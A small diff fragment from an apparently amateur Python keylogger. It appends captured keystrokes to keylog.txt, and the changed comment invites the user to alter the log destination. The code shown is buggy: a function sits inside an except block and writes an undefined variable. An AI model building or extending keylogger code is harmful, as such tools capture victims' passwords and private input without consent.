@@ -8,7 +8,7 @@ try:
     file.write("KEYLOGGER\n")
 except FileExistsError:
   def write_to_file(filename, data):
-     with open("keylog.txt", "a") as file:                       # Attempt to add data a existing file
+     with open("keylog.txt", "a") as file:                       # Attempt to add data a existing file , change the destination as your preference
         file.write(data_to_write)
 
   def on_press(key):
